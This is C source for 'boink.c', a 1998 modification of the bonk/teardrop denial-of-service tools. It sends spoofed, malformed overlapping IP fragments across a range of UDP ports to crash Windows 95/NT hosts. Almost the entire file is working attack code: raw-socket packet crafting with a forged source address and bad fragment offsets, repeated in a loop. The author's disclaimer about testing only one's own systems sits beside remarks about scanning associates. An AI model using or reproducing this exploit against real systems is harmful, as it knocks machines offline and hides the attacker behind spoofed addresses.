
/*
  boink.c - a modified bonk.c
    
    
                                ==bendi - 1998==

                        bonk.c        -         5/01/1998
        Based On: teardrop.c by route|daemon9 & klepto
        Crashes *patched* win95/(NT?) machines.

        Basically, we set the frag offset > header length (teardrop
        reversed). There are many theories as to why this works,
        however i do not have the resources to perform extensive testing.
        I make no warranties. Use this code at your own risk.
        Rip it if you like, i've had my fun.

    Modified by defile(efnet) [9/01/98]
        
        As it stood before, bonk.c just simply attacked port 55.
        Upon scanning my associates, I've noticed port 55 isn't
        always open. It varies in fact, while other ports remain
        open and vulnerable to this attack. I realized that Microsoft
        just might fix this by blocking port 55 off or something
        completely lame like that, and that is unacceptable.
        
        As of this modification, you provide both a "start" and a
        "stop" port to test for the weakness, in the attempt to catch
        a possibly open port. (I've noticed port 55 seemed to come open
        more frequently on machines that were running IE though)
        
        Hopefully this will encourage Microsoft to write a REAL fix
        instead of just make lackey fixes as they've had in the past.
        
        Please only use this to test your own systems for vulnerability,
        and if it is, bitch at Microsoft for a fix. I am not responsible
        for any damage that may come and as stated above by the
        author, this might not even work. I make no claims
        to the ownership to any portions of this source in any way.
        
        
*/

#include <stdio.h>
#include <string.h>

#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include "../include/in.h"
#include "../include/ip.h"
#include <linux/udp.h>
#include "../include/protocols.h"
#include <arpa/inet.h>

#define FRG_CONST       0x3
#define PADDING         0x1c

struct udp_pkt
{
        struct iphdr    ip;
        struct udphdr   udp;
        char data[PADDING];
} pkt;

int     udplen=sizeof(struct udphdr),
        iplen=sizeof(struct iphdr),
        datalen=100,
        psize=sizeof(struct udphdr)+sizeof(struct iphdr)+PADDING,
        spf_sck;                        /* Socket */

void boink_usage(void)
{
        /* fprintf(stderr, "boink_usage: ./bonk <src_addr> <dst_addr> [num]\n"); */
        fprintf (stderr, "boink_usage: ./boink <src_addr> <dst_addr> <start_port> <stop_port> [num]\n");
        exit(0);
}

u_long host_to_ip(char *host_name)
{
        static  u_long ip_bytes;
        struct hostent *res;

        res = gethostbyname(host_name);
        if (res == NULL)
                return (0);
        memcpy(&ip_bytes, res->h_addr, res->h_length);
        return (ip_bytes);
}

void quit(char *reason)
{
        perror(reason);
        close(spf_sck);
        exit(-1);
}

int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt,
           int dst_prt)
{
        int     bs;
        struct  sockaddr_in to;

        memset(&pkt, 0, psize);
                                                /* Fill in ip header */
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(udplen + iplen + PADDING);
        pkt.ip.id = htons(0x455);
        pkt.ip.ttl = 255;
        pkt.ip.protocol = IP_UDP;
        pkt.ip.saddr = src_addr;
        pkt.ip.daddr = dst_addr;
        pkt.ip.frag_off = htons(0x2000);        /* more to come */

        pkt.udp.source = htons(src_prt);        /* udp header */
        pkt.udp.dest = htons(dst_prt);
        pkt.udp.len = htons(8 + PADDING);
                                                /* send 1st frag */

        to.sin_family = AF_INET;
        to.sin_port = src_prt;
        to.sin_addr.s_addr = dst_addr;

        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
                sizeof(struct sockaddr));

        pkt.ip.frag_off = htons(FRG_CONST + 1);         /* shinanigan */
        pkt.ip.tot_len = htons(iplen + FRG_CONST);
                                                        /* 2nd frag */

        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0,
                (struct sockaddr *) &to, sizeof(struct sockaddr));

        return bs;
}

void boink_main(int argc, char *argv[])
{
        u_long  src_addr,
                dst_addr;

        int     i,
               /* src_prt = 55,
                  dst_prt = 55, */ 
                start_port,
                stop_port,
                bs = 1,
                pkt_count;

        if (argc < 5)
                boink_usage();

        start_port = (u_short) atoi (argv[ 3 ]);
        stop_port = (u_short) atoi (argv[ 4 ]);        
        if (argc == 6)
              pkt_count = atoi (argv[ 5 ]);
        
        
        if (start_port >= stop_port ||
            stop_port <= start_port) {
                
                start_port = 25;
                stop_port = 65;
        
        }
        
            
        if (pkt_count == 0)	pkt_count = 10;
        
        /* Resolve hostnames */

        src_addr = host_to_ip(argv[1]);
        if (!src_addr)
                quit("bad source host");
        dst_addr = host_to_ip(argv[2]);
        if (!dst_addr)
                quit("bad target host");

        spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (!spf_sck)
                quit("socket()");
        if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,
        sizeof(bs)) < 0)
                quit("IP_HDRINCL");

        for (i = 0; i < pkt_count; ++i)
        {
                int j;
                
                printf ("(%d)%s:%d->%d\n", i, argv[ 2 ], start_port, stop_port);
                
                for (j = start_port; j != stop_port; j++) {
                
                 /* fondle(spf_sck, src_addr, dst_addr, src_prt, dst_prt); */
                    fondle (spf_sck, src_addr, dst_addr, j, j);

                }
                usleep(10000);
        }

        printf("Done.\n");
}
